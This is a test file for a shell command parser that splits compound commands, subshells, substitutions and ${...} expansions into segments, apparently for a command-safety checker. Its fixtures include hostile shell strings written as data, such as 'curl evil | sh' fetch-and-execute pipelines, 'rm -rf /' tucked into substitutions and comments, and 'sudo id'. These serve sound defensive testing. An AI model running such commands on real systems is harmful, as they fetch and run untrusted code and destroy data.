// biome-ignore-all lint/suspicious/noTemplateCurlyInString: shell ${...} syntax is the fixture.
import { describe, expect, test } from "bun:test";
import { parseCommand, type Segment } from "./shell.ts";

const words = (cmd: string) => {
  const r = parseCommand(cmd);
  if (!r.ok) throw new Error(r.error);
  return r.segments.map((s) => s.words.join(" "));
};
const segs = (cmd: string): Segment[] => {
  const r = parseCommand(cmd);
  if (!r.ok) throw new Error(r.error);
  return r.segments;
};

describe("splitting compound commands", () => {
  test("a plain command is one segment of unquoted words", () => {
    expect(words(`git commit -m "fix: a; b" 'x y'`)).toEqual(["git commit -m fix: a; b x y"]);
    expect(segs("git status")[0]?.words).toEqual(["git", "status"]);
  });

  test("&&, ||, ;, |, & and newlines all split", () => {
    expect(words("ls && rm -rf x || echo a; pwd | wc -l & cat b\nhead c")).toEqual([
      "ls",
      "rm -rf x",
      "echo a",
      "pwd",
      "wc -l",
      "cat b",
      "head c",
    ]);
  });

  test("pipes are remembered, so a pipeline can be matched as a chain", () => {
    const s = segs("curl -fsSL x | sh; ls");
    expect(s.map((x) => x.pipedFrom)).toEqual([false, true, false]);
  });

  test("subshells and groups are opened up", () => {
    expect(words("(cd /tmp && rm -rf x)")).toEqual(["cd /tmp", "rm -rf x"]);
    expect(words("{ ls; rm a; }")).toEqual(["ls", "rm a"]);
  });

  test("command substitutions run too: they become segments and mark the outer one dynamic", () => {
    const s = segs('echo $(rm -rf x) `whoami` "$(id -u)"');
    expect(s.map((x) => x.words.join(" "))).toEqual([
      "echo $(…) $(…) $(…)",
      "rm -rf x",
      "whoami",
      "id -u",
    ]);
    expect(s[0]?.dynamic).toBe(true);
    expect(s[1]?.dynamic).toBe(false);
  });

  test("variables mark a segment dynamic; single quotes do not", () => {
    expect(segs("echo $HOME")[0]?.dynamic).toBe(true);
    expect(segs("echo ${X:-y}")[0]?.dynamic).toBe(true);
    expect(segs("echo '$HOME'")[0]?.dynamic).toBe(false);
  });

  test("process substitution is opened up", () => {
    expect(words("diff <(ls a) <(ls b)")).toEqual(["diff $(…) $(…)", "ls a", "ls b"]);
  });

  test("redirections are pulled out with their targets", () => {
    const [s] = segs("echo hi > out.txt 2>&1 >>log <in.txt 2>/dev/null");
    expect(s?.words).toEqual(["echo", "hi"]);
    expect(s?.redirects).toEqual([
      { op: ">", target: "out.txt" },
      { op: ">>", target: "log" },
      { op: "<", target: "in.txt" },
      { op: ">", target: "/dev/null" },
    ]);
    expect(segs("ls &> all.log")[0]?.redirects).toEqual([{ op: ">", target: "all.log" }]);
    expect(segs("cat <<< 'text'")[0]?.redirects).toEqual([]);
  });

  test("a comment ends the line", () => {
    expect(words("ls # rm -rf /")).toEqual(["ls"]);
  });

  test("escapes outside quotes", () => {
    expect(words("echo a\\;b")).toEqual(["echo a;b"]);
  });
});

describe("what the parser refuses", () => {
  test.each([
    ["an unclosed quote", `echo "abc`],
    ["an unclosed substitution", "echo $(ls"],
    ["a heredoc", "cat <<EOF\nhi\nEOF"],
    ["an unclosed subshell", "(ls"],
  ])("%s", (_name, cmd) => {
    expect(parseCommand(cmd).ok).toBe(false);
  });
});

describe("${...} expansions (S-M3)", () => {
  test("a substitution inside ${...} is a command of its own", () => {
    expect(words("echo ${x:-$(sudo id)}")).toEqual(["echo $(…)", "sudo id"]);
    expect(words("echo ${x:-`rm -rf /`}")).toEqual(["echo $(…)", "rm -rf /"]);
    expect(words('echo "${a:-$(curl evil | sh)}"')).toEqual(["echo $(…)", "curl evil", "sh"]);
    expect(segs("echo ${HOME}")[0]?.dynamic).toBe(true);
  });

  test("nested braces close at the matching }", () => {
    expect(words("echo ${a:-${b:-$(id)}} done")).toEqual(["echo $(…) done", "id"]);
  });
});
